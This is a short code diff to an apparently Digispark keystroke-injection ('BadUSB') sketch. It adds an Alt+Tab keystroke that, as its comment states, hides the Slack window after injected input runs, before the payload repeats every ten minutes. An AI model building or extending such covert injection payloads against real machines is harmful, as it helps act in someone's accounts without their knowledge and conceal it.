@@ -39,6 +39,10 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
 
+  // Alt+tab to hide the Slack window (once again - depends on many factors, like number of displays, if slack was visible before the execution, etc.)
+  // 0x2B == "Keyboard Tab"; as described in: https://usb.org/sites/default/files/hut1_4.pdf
+  DigiKeyboard.sendKeyStroke(0x2B, MOD_ALT_LEFT);
+
   // Delay to disconnect before payload execs again (600000 milliseconds == 10 minutes)
   DigiKeyboard.delay(600000);
 }
